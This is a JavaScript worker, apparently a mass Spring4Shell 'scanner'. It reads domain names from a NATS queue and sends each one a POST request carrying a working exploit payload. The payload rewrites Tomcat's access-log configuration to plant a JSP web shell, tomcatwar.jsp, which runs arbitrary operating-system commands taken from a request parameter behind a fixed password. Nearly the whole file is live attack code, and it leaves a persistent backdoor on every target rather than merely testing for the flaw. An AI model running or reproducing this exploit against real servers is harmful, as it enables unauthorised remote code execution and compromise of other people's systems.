import { config } from 'dotenv-safe'
import { connect, JSONCodec } from 'nats'

config()

const { SUBSCRIBE_TO: topic, NATS_URL } = process.env

const headers = {
  suffix: '%>//',
  c1: 'Runtime',
  c2: '<%',
  DNT: '1',
  'Content-Type': 'application/x-www-form-urlencoded',
}
const body =
  'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='

process.on('SIGTERM', () => process.exit(0))
process.on('SIGINT', () => process.exit(0))
;(async () => {
  const nc = await connect({ servers: NATS_URL })

  // create a codec
  const jc = JSONCodec()
  // create a simple subscriber and iterate over messages
  // matching the subscription
  const sub = nc.subscribe(topic, { queue: 'spring4shell-scanner' })
  for await (const m of sub) {
    const { domain } = jc.decode(m.data)
    try {
      const res = await fetch(`https://${domain}`, {
        method: 'POST',
        body,
        headers,
      })
      const data = await res.text()
      console.log({ data })
    } catch (err) {
      console.error(err)
    }
  }
  console.log('subscription closed')

  // we want to insure that messages that are in flight
  // get processed, so we are going to drain the
  // connection. Drain is the same as close, but makes
  // sure that all messages in flight get seen
  // by the iterator. After calling drain on the connection
  // the connection closes.
  await nc.drain()

  process.exit(0)
})()
